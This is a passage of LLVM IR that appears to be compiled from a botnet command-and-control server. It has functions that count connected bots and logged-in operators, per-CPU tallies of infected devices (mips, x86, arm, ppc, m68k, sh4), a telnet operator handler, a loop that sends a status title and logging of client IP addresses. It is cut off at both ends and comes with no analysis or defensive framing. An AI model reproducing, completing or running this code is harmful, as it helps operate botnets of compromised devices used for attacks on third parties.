  br label %217, !llvm.loop !13

388:                                              ; preds = %242, %232, %226
  %389 = load i64, i64* %18, align 8
  %390 = icmp eq i64 %389, -1
  br i1 %390, label %391, label %397

391:                                              ; preds = %388
  %392 = call i32* @__errno_location() #10
  %393 = load i32, i32* %392, align 4
  %394 = icmp ne i32 %393, 11
  br i1 %394, label %395, label %396

395:                                              ; preds = %391
  store i32 1, i32* %17, align 4
  br label %396

396:                                              ; preds = %395, %391
  br label %425

397:                                              ; preds = %388
  %398 = load i64, i64* %18, align 8
  %399 = icmp eq i64 %398, 0
  br i1 %399, label %400, label %401

400:                                              ; preds = %397
  store i32 1, i32* %17, align 4
  br label %425

401:                                              ; preds = %397
  br label %402

402:                                              ; preds = %401
  %403 = load i32, i32* %17, align 4
  %404 = icmp ne i32 %403, 0
  br i1 %404, label %405, label %424

405:                                              ; preds = %402
  %406 = load %struct.clientdata_t*, %struct.clientdata_t** %16, align 8
  %407 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %406, i32 0, i32 1
  store i8 0, i8* %407, align 4
  %408 = load %struct.clientdata_t*, %struct.clientdata_t** %16, align 8
  %409 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %408, i32 0, i32 2
  store i8 0, i8* %409, align 1
  %410 = load %struct.clientdata_t*, %struct.clientdata_t** %16, align 8
  %411 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %410, i32 0, i32 3
  store i8 0, i8* %411, align 2
  %412 = load %struct.clientdata_t*, %struct.clientdata_t** %16, align 8
  %413 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %412, i32 0, i32 4
  store i8 0, i8* %413, align 1
  %414 = load %struct.clientdata_t*, %struct.clientdata_t** %16, align 8
  %415 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %414, i32 0, i32 5
  store i8 0, i8* %415, align 4
  %416 = load %struct.clientdata_t*, %struct.clientdata_t** %16, align 8
  %417 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %416, i32 0, i32 6
  store i8 0, i8* %417, align 1
  %418 = load %struct.clientdata_t*, %struct.clientdata_t** %16, align 8
  %419 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %418, i32 0, i32 7
  store i8 0, i8* %419, align 2
  %420 = load %struct.clientdata_t*, %struct.clientdata_t** %16, align 8
  %421 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %420, i32 0, i32 8
  store i8 0, i8* %421, align 1
  %422 = load i32, i32* %15, align 4
  %423 = call i32 @close(i32 %422)
  br label %424

424:                                              ; preds = %405, %402
  br label %215

425:                                              ; preds = %400, %396
  br label %426

426:                                              ; preds = %425
  br label %427

427:                                              ; preds = %426
  br label %428

428:                                              ; preds = %427, %201, %70
  %429 = load i32, i32* %9, align 4
  %430 = add nsw i32 %429, 1
  store i32 %430, i32* %9, align 4
  br label %39, !llvm.loop !14

431:                                              ; preds = %39
  br label %35
}

; Function Attrs: nounwind
declare noalias align 16 i8* @calloc(i64, i64) #3

declare i32 @epoll_wait(i32, %struct.epoll_event*, i32, i32) #1

declare i32 @close(i32) #1

declare i32 @accept(i32, %struct.sockaddr*, i32*) #1

; Function Attrs: nounwind readnone willreturn
declare i32* @__errno_location() #5

declare void @perror(i8*) #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define internal i32 @make_socket_non_blocking(i32 %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  %6 = load i32, i32* %3, align 4
  %7 = call i32 (i32, i32, ...) @fcntl(i32 %6, i32 3, i32 0)
  store i32 %7, i32* %4, align 4
  %8 = load i32, i32* %4, align 4
  %9 = icmp eq i32 %8, -1
  br i1 %9, label %10, label %11

10:                                               ; preds = %1
  call void @perror(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.148, i64 0, i64 0))
  store i32 -1, i32* %2, align 4
  br label %21

11:                                               ; preds = %1
  %12 = load i32, i32* %4, align 4
  %13 = or i32 %12, 2048
  store i32 %13, i32* %4, align 4
  %14 = load i32, i32* %3, align 4
  %15 = load i32, i32* %4, align 4
  %16 = call i32 (i32, i32, ...) @fcntl(i32 %14, i32 4, i32 %15)
  store i32 %16, i32* %5, align 4
  %17 = load i32, i32* %5, align 4
  %18 = icmp eq i32 %17, -1
  br i1 %18, label %19, label %20

19:                                               ; preds = %11
  call void @perror(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.148, i64 0, i64 0))
  store i32 -1, i32* %2, align 4
  br label %21

20:                                               ; preds = %11
  store i32 0, i32* %2, align 4
  br label %21

21:                                               ; preds = %20, %19, %10
  %22 = load i32, i32* %2, align 4
  ret i32 %22
}

; Function Attrs: nounwind
declare i32 @epoll_ctl(i32, i32, i32, %struct.epoll_event*) #3

; Function Attrs: nounwind readonly willreturn
declare i8* @strstr(i8*, i8*) #2

declare i32 @fprintf(%struct._IO_FILE*, i8*, ...) #1

declare i32 @fflush(%struct._IO_FILE*) #1

declare i32 @printf(i8*, ...) #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @mips() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  store i32 0, i32* %2, align 4
  store i32 0, i32* %1, align 4
  br label %3

3:                                                ; preds = %17, %0
  %4 = load i32, i32* %1, align 4
  %5 = icmp slt i32 %4, 1000000
  br i1 %5, label %6, label %20

6:                                                ; preds = %3
  %7 = load i32, i32* %1, align 4
  %8 = sext i32 %7 to i64
  %9 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %8
  %10 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %9, i32 0, i32 2
  %11 = load i8, i8* %10, align 1
  %12 = icmp ne i8 %11, 0
  br i1 %12, label %14, label %13

13:                                               ; preds = %6
  br label %17

14:                                               ; preds = %6
  %15 = load i32, i32* %2, align 4
  %16 = add nsw i32 %15, 1
  store i32 %16, i32* %2, align 4
  br label %17

17:                                               ; preds = %14, %13
  %18 = load i32, i32* %1, align 4
  %19 = add nsw i32 %18, 1
  store i32 %19, i32* %1, align 4
  br label %3, !llvm.loop !15

20:                                               ; preds = %3
  %21 = load i32, i32* %2, align 4
  ret i32 %21
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @x86() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  store i32 0, i32* %2, align 4
  store i32 0, i32* %1, align 4
  br label %3

3:                                                ; preds = %17, %0
  %4 = load i32, i32* %1, align 4
  %5 = icmp slt i32 %4, 1000000
  br i1 %5, label %6, label %20

6:                                                ; preds = %3
  %7 = load i32, i32* %1, align 4
  %8 = sext i32 %7 to i64
  %9 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %8
  %10 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %9, i32 0, i32 3
  %11 = load i8, i8* %10, align 2
  %12 = icmp ne i8 %11, 0
  br i1 %12, label %14, label %13

13:                                               ; preds = %6
  br label %17

14:                                               ; preds = %6
  %15 = load i32, i32* %2, align 4
  %16 = add nsw i32 %15, 1
  store i32 %16, i32* %2, align 4
  br label %17

17:                                               ; preds = %14, %13
  %18 = load i32, i32* %1, align 4
  %19 = add nsw i32 %18, 1
  store i32 %19, i32* %1, align 4
  br label %3, !llvm.loop !16

20:                                               ; preds = %3
  %21 = load i32, i32* %2, align 4
  ret i32 %21
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @arm() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  store i32 0, i32* %2, align 4
  store i32 0, i32* %1, align 4
  br label %3

3:                                                ; preds = %17, %0
  %4 = load i32, i32* %1, align 4
  %5 = icmp slt i32 %4, 1000000
  br i1 %5, label %6, label %20

6:                                                ; preds = %3
  %7 = load i32, i32* %1, align 4
  %8 = sext i32 %7 to i64
  %9 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %8
  %10 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %9, i32 0, i32 7
  %11 = load i8, i8* %10, align 2
  %12 = icmp ne i8 %11, 0
  br i1 %12, label %14, label %13

13:                                               ; preds = %6
  br label %17

14:                                               ; preds = %6
  %15 = load i32, i32* %2, align 4
  %16 = add nsw i32 %15, 1
  store i32 %16, i32* %2, align 4
  br label %17

17:                                               ; preds = %14, %13
  %18 = load i32, i32* %1, align 4
  %19 = add nsw i32 %18, 1
  store i32 %19, i32* %1, align 4
  br label %3, !llvm.loop !17

20:                                               ; preds = %3
  %21 = load i32, i32* %2, align 4
  ret i32 %21
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @ppc() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  store i32 0, i32* %2, align 4
  store i32 0, i32* %1, align 4
  br label %3

3:                                                ; preds = %17, %0
  %4 = load i32, i32* %1, align 4
  %5 = icmp slt i32 %4, 1000000
  br i1 %5, label %6, label %20

6:                                                ; preds = %3
  %7 = load i32, i32* %1, align 4
  %8 = sext i32 %7 to i64
  %9 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %8
  %10 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %9, i32 0, i32 4
  %11 = load i8, i8* %10, align 1
  %12 = icmp ne i8 %11, 0
  br i1 %12, label %14, label %13

13:                                               ; preds = %6
  br label %17

14:                                               ; preds = %6
  %15 = load i32, i32* %2, align 4
  %16 = add nsw i32 %15, 1
  store i32 %16, i32* %2, align 4
  br label %17

17:                                               ; preds = %14, %13
  %18 = load i32, i32* %1, align 4
  %19 = add nsw i32 %18, 1
  store i32 %19, i32* %1, align 4
  br label %3, !llvm.loop !18

20:                                               ; preds = %3
  %21 = load i32, i32* %2, align 4
  ret i32 %21
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @m68k() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  store i32 0, i32* %2, align 4
  store i32 0, i32* %1, align 4
  br label %3

3:                                                ; preds = %17, %0
  %4 = load i32, i32* %1, align 4
  %5 = icmp slt i32 %4, 1000000
  br i1 %5, label %6, label %20

6:                                                ; preds = %3
  %7 = load i32, i32* %1, align 4
  %8 = sext i32 %7 to i64
  %9 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %8
  %10 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %9, i32 0, i32 5
  %11 = load i8, i8* %10, align 4
  %12 = icmp ne i8 %11, 0
  br i1 %12, label %14, label %13

13:                                               ; preds = %6
  br label %17

14:                                               ; preds = %6
  %15 = load i32, i32* %2, align 4
  %16 = add nsw i32 %15, 1
  store i32 %16, i32* %2, align 4
  br label %17

17:                                               ; preds = %14, %13
  %18 = load i32, i32* %1, align 4
  %19 = add nsw i32 %18, 1
  store i32 %19, i32* %1, align 4
  br label %3, !llvm.loop !19

20:                                               ; preds = %3
  %21 = load i32, i32* %2, align 4
  ret i32 %21
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @spc() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  store i32 0, i32* %2, align 4
  store i32 0, i32* %1, align 4
  br label %3

3:                                                ; preds = %17, %0
  %4 = load i32, i32* %1, align 4
  %5 = icmp slt i32 %4, 1000000
  br i1 %5, label %6, label %20

6:                                                ; preds = %3
  %7 = load i32, i32* %1, align 4
  %8 = sext i32 %7 to i64
  %9 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %8
  %10 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %9, i32 0, i32 6
  %11 = load i8, i8* %10, align 1
  %12 = icmp ne i8 %11, 0
  br i1 %12, label %14, label %13

13:                                               ; preds = %6
  br label %17

14:                                               ; preds = %6
  %15 = load i32, i32* %2, align 4
  %16 = add nsw i32 %15, 1
  store i32 %16, i32* %2, align 4
  br label %17

17:                                               ; preds = %14, %13
  %18 = load i32, i32* %1, align 4
  %19 = add nsw i32 %18, 1
  store i32 %19, i32* %1, align 4
  br label %3, !llvm.loop !20

20:                                               ; preds = %3
  %21 = load i32, i32* %2, align 4
  ret i32 %21
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @sh4() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  store i32 0, i32* %2, align 4
  store i32 0, i32* %1, align 4
  br label %3

3:                                                ; preds = %17, %0
  %4 = load i32, i32* %1, align 4
  %5 = icmp slt i32 %4, 1000000
  br i1 %5, label %6, label %20

6:                                                ; preds = %3
  %7 = load i32, i32* %1, align 4
  %8 = sext i32 %7 to i64
  %9 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %8
  %10 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %9, i32 0, i32 8
  %11 = load i8, i8* %10, align 1
  %12 = icmp ne i8 %11, 0
  br i1 %12, label %14, label %13

13:                                               ; preds = %6
  br label %17

14:                                               ; preds = %6
  %15 = load i32, i32* %2, align 4
  %16 = add nsw i32 %15, 1
  store i32 %16, i32* %2, align 4
  br label %17

17:                                               ; preds = %14, %13
  %18 = load i32, i32* %1, align 4
  %19 = add nsw i32 %18, 1
  store i32 %19, i32* %1, align 4
  br label %3, !llvm.loop !21

20:                                               ; preds = %3
  %21 = load i32, i32* %2, align 4
  ret i32 %21
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @BotsConnected() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  store i32 0, i32* %2, align 4
  store i32 0, i32* %1, align 4
  br label %3

3:                                                ; preds = %17, %0
  %4 = load i32, i32* %1, align 4
  %5 = icmp slt i32 %4, 1000000
  br i1 %5, label %6, label %20

6:                                                ; preds = %3
  %7 = load i32, i32* %1, align 4
  %8 = sext i32 %7 to i64
  %9 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %8
  %10 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %9, i32 0, i32 1
  %11 = load i8, i8* %10, align 4
  %12 = icmp ne i8 %11, 0
  br i1 %12, label %14, label %13

13:                                               ; preds = %6
  br label %17

14:                                               ; preds = %6
  %15 = load i32, i32* %2, align 4
  %16 = add nsw i32 %15, 1
  store i32 %16, i32* %2, align 4
  br label %17

17:                                               ; preds = %14, %13
  %18 = load i32, i32* %1, align 4
  %19 = add nsw i32 %18, 1
  store i32 %19, i32* %1, align 4
  br label %3, !llvm.loop !22

20:                                               ; preds = %3
  %21 = load i32, i32* %2, align 4
  ret i32 %21
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i8* @titleWriter(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca [2048 x i8], align 16
  store i8* %0, i8** %2, align 8
  %5 = load i8*, i8** %2, align 8
  %6 = ptrtoint i8* %5 to i32
  store i32 %6, i32* %3, align 4
  br label %7

7:                                                ; preds = %1, %20
  %8 = getelementptr inbounds [2048 x i8], [2048 x i8]* %4, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %8, i8 0, i64 2048, i1 false)
  %9 = getelementptr inbounds [2048 x i8], [2048 x i8]* %4, i64 0, i64 0
  %10 = call i32 @BotsConnected()
  %11 = load volatile i32, i32* @OperatorsConnected, align 4
  %12 = call i32 (i8*, i8*, ...) @sprintf(i8* %9, i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.26, i64 0, i64 0), i32 27, i32 %10, i32 %11, i32 7) #9
  %13 = load i32, i32* %3, align 4
  %14 = getelementptr inbounds [2048 x i8], [2048 x i8]* %4, i64 0, i64 0
  %15 = getelementptr inbounds [2048 x i8], [2048 x i8]* %4, i64 0, i64 0
  %16 = call i64 @strlen(i8* %15) #8
  %17 = call i64 @send(i32 %13, i8* %14, i64 %16, i32 16384)
  %18 = icmp eq i64 %17, -1
  br i1 %18, label %19, label %20

19:                                               ; preds = %7
  ret i8* null

20:                                               ; preds = %7
  %21 = call i32 @sleep(i32 3)
  br label %7
}

; Function Attrs: nounwind
declare i32 @sprintf(i8*, i8*, ...) #3

declare i32 @sleep(i32) #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @file_exist(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca %struct.stat, align 8
  store i8* %0, i8** %2, align 8
  %4 = load i8*, i8** %2, align 8
  %5 = call i32 (i8*, %struct.stat*, ...) bitcast (i32 (...)* @stat to i32 (i8*, %struct.stat*, ...)*)(i8* %4, %struct.stat* %3)
  %6 = icmp eq i32 %5, 0
  %7 = zext i1 %6 to i32
  ret i32 %7
}

declare i32 @stat(...) #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @Search_in_File(i8* %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca %struct._IO_FILE*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca [512 x i8], align 16
  store i8* %0, i8** %3, align 8
  store i32 0, i32* %5, align 4
  store i32 0, i32* %6, align 4
  store i32 0, i32* %7, align 4
  %9 = call noalias %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.27, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.28, i64 0, i64 0))
  store %struct._IO_FILE* %9, %struct._IO_FILE** %4, align 8
  %10 = icmp eq %struct._IO_FILE* %9, null
  br i1 %10, label %11, label %12

11:                                               ; preds = %1
  store i32 -1, i32* %2, align 4
  br label %42

12:                                               ; preds = %1
  br label %13

13:                                               ; preds = %27, %12
  %14 = getelementptr inbounds [512 x i8], [512 x i8]* %8, i64 0, i64 0
  %15 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %16 = call i8* @fgets(i8* %14, i32 512, %struct._IO_FILE* %15)
  %17 = icmp ne i8* %16, null
  br i1 %17, label %18, label %30

18:                                               ; preds = %13
  %19 = getelementptr inbounds [512 x i8], [512 x i8]* %8, i64 0, i64 0
  %20 = load i8*, i8** %3, align 8
  %21 = call i8* @strstr(i8* %19, i8* %20) #8
  %22 = icmp ne i8* %21, null
  br i1 %22, label %23, label %27

23:                                               ; preds = %18
  %24 = load i32, i32* %6, align 4
  %25 = add nsw i32 %24, 1
  store i32 %25, i32* %6, align 4
  %26 = load i32, i32* %5, align 4
  store i32 %26, i32* %7, align 4
  br label %27

27:                                               ; preds = %23, %18
  %28 = load i32, i32* %5, align 4
  %29 = add nsw i32 %28, 1
  store i32 %29, i32* %5, align 4
  br label %13, !llvm.loop !23

30:                                               ; preds = %13
  %31 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %32 = icmp ne %struct._IO_FILE* %31, null
  br i1 %32, label %33, label %36

33:                                               ; preds = %30
  %34 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %35 = call i32 @fclose(%struct._IO_FILE* %34)
  br label %36

36:                                               ; preds = %33, %30
  %37 = load i32, i32* %6, align 4
  %38 = icmp eq i32 %37, 0
  br i1 %38, label %39, label %40

39:                                               ; preds = %36
  store i32 0, i32* %2, align 4
  br label %42

40:                                               ; preds = %36
  %41 = load i32, i32* %7, align 4
  store i32 %41, i32* %2, align 4
  br label %42

42:                                               ; preds = %40, %39, %11
  %43 = load i32, i32* %2, align 4
  ret i32 %43
}

declare noalias %struct._IO_FILE* @fopen(i8*, i8*) #1

declare i8* @fgets(i8*, i32, %struct._IO_FILE*) #1

declare i32 @fclose(%struct._IO_FILE*) #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @client_addr(i64 %0, i64 %1) #0 {
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = alloca %struct._IO_FILE*, align 8
  %5 = bitcast %struct.sockaddr_in* %3 to { i64, i64 }*
  %6 = getelementptr inbounds { i64, i64 }, { i64, i64 }* %5, i32 0, i32 0
  store i64 %0, i64* %6, align 4
  %7 = getelementptr inbounds { i64, i64 }, { i64, i64 }* %5, i32 0, i32 1
  store i64 %1, i64* %7, align 4
  %8 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %9 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %8, i32 0, i32 0
  %10 = load i32, i32* %9, align 4
  %11 = and i32 %10, 255
  %12 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %13 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %12, i32 0, i32 0
  %14 = load i32, i32* %13, align 4
  %15 = and i32 %14, 65280
  %16 = lshr i32 %15, 8
  %17 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %18 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %17, i32 0, i32 0
  %19 = load i32, i32* %18, align 4
  %20 = and i32 %19, 16711680
  %21 = lshr i32 %20, 16
  %22 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %23 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %22, i32 0, i32 0
  %24 = load i32, i32* %23, align 4
  %25 = and i32 %24, -16777216
  %26 = lshr i32 %25, 24
  %27 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.29, i64 0, i64 0), i32 %11, i32 %16, i32 %21, i32 %26)
  %28 = call noalias %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.30, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.31, i64 0, i64 0))
  store %struct._IO_FILE* %28, %struct._IO_FILE** %4, align 8
  %29 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %30 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %31 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %30, i32 0, i32 0
  %32 = load i32, i32* %31, align 4
  %33 = and i32 %32, 255
  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %35 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %34, i32 0, i32 0
  %36 = load i32, i32* %35, align 4
  %37 = and i32 %36, 65280
  %38 = lshr i32 %37, 8
  %39 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %40 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %39, i32 0, i32 0
  %41 = load i32, i32* %40, align 4
  %42 = and i32 %41, 16711680
  %43 = lshr i32 %42, 16
  %44 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %45 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %44, i32 0, i32 0
  %46 = load i32, i32* %45, align 4
  %47 = and i32 %46, -16777216
  %48 = lshr i32 %47, 24
  %49 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %29, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.32, i64 0, i64 0), i32 %33, i32 %38, i32 %43, i32 %48)
  %50 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %51 = call i32 @fclose(%struct._IO_FILE* %50)
  ret void
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i8* @telnetWorker(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i8*, align 8
  %4 = alloca [80 x i8], align 16
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i64, align 8
  %8 = alloca [2048 x i8], align 16
  %9 = alloca [2048 x i8], align 16
  %10 = alloca i8*, align 8
  %11 = alloca i8*, align 8
  %12 = alloca i8*, align 8
  %13 = alloca [2048 x i8], align 16
  %14 = alloca [2048 x i8], align 16
  %15 = alloca [2048 x i8], align 16
  %16 = alloca [2048 x i8], align 16
  %17 = alloca [2048 x i8], align 16
  %18 = alloca [2048 x i8], align 16
  %19 = alloca [2048 x i8], align 16
  %20 = alloca [2048 x i8], align 16
  %21 = alloca [2048 x i8], align 16
  %22 = alloca [2048 x i8], align 16
  %23 = alloca [2048 x i8], align 16
  %24 = alloca %struct._IO_FILE*, align 8
  %25 = alloca i32, align 4
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  %28 = alloca [80 x i8], align 16
  %29 = alloca [80 x i8], align 16
  %30 = alloca [80 x i8], align 16
  %31 = alloca [80 x i8], align 16
  %32 = alloca [80 x i8], align 16
  %33 = alloca [80 x i8], align 16
  %34 = alloca [2048 x i8], align 16
  %35 = alloca [999 x i8], align 16
  %36 = alloca [999 x i8], align 16
  %37 = alloca [999 x i8], align 16
  %38 = alloca [999 x i8], align 16
  %39 = alloca [999 x i8], align 16
  %40 = alloca [999 x i8], align 16
  %41 = alloca [999 x i8], align 16
  %42 = alloca [999 x i8], align 16
  %43 = alloca [999 x i8], align 16
  %44 = alloca [999 x i8], align 16
  %45 = alloca [80 x i8], align 16
  %46 = alloca [80 x i8], align 16
  %47 = alloca [80 x i8], align 16
  %48 = alloca [80 x i8], align 16
  %49 = alloca [80 x i8], align 16
  %50 = alloca [80 x i8], align 16
  %51 = alloca [80 x i8], align 16
  %52 = alloca [80 x i8], align 16
  %53 = alloca [80 x i8], align 16
  %54 = alloca [80 x i8], align 16
  %55 = alloca [80 x i8], align 16
  %56 = alloca [80 x i8], align 16
  %57 = alloca [80 x i8], align 16
  %58 = alloca [80 x i8], align 16
  %59 = alloca [80 x i8], align 16
  %60 = alloca [80 x i8], align 16
  %61 = alloca [80 x i8], align 16
  %62 = alloca [80 x i8], align 16
  %63 = alloca %struct._IO_FILE*, align 8
  %64 = alloca %struct._IO_FILE*, align 8
  %65 = alloca %struct._IO_FILE*, align 8
  store i8* %0, i8** %3, align 8
  %66 = load i8*, i8** %3, align 8
  %67 = ptrtoint i8* %66 to i32
  store i32 %67, i32* %5, align 4
  %68 = load volatile i32, i32* @OperatorsConnected, align 4
  %69 = add nsw i32 %68, 1
  store volatile i32 %69, i32* @OperatorsConnected, align 4
  %70 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %70, i8 0, i64 2048, i1 false)
  %71 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %71, i8 0, i64 2048, i1 false)
  %72 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %72, i8 0, i64 2048, i1 false)
  %73 = getelementptr inbounds [2048 x i8], [2048 x i8]* %14, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %73, i8 0, i64 2048, i1 false)
  %74 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %74, i8 0, i64 2048, i1 false)
  %75 = getelementptr inbounds [2048 x i8], [2048 x i8]* %16, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %75, i8 0, i64 2048, i1 false)
  %76 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %76, i8 0, i64 2048, i1 false)
  %77 = getelementptr inbounds [2048 x i8], [2048 x i8]* %18, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %77, i8 0, i64 2048, i1 false)
  %78 = getelementptr inbounds [2048 x i8], [2048 x i8]* %19, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %78, i8 0, i64 2048, i1 false)
  %79 = getelementptr inbounds [2048 x i8], [2048 x i8]* %20, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %79, i8 0, i64 2048, i1 false)
  %80 = getelementptr inbounds [2048 x i8], [2048 x i8]* %21, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %80, i8 0, i64 2048, i1 false)
  %81 = getelementptr inbounds [2048 x i8], [2048 x i8]* %22, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %81, i8 0, i64 2048, i1 false)
  %82 = getelementptr inbounds [2048 x i8], [2048 x i8]* %23, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %82, i8 0, i64 2048, i1 false)
  store i32 0, i32* %25, align 4
  %83 = call noalias %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.27, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.28, i64 0, i64 0))
  store %struct._IO_FILE* %83, %struct._IO_FILE** %24, align 8
  br label %84

84:                                               ; preds = %89, %1
  %85 = load %struct._IO_FILE*, %struct._IO_FILE** %24, align 8
  %86 = call i32 @feof(%struct._IO_FILE* %85) #9
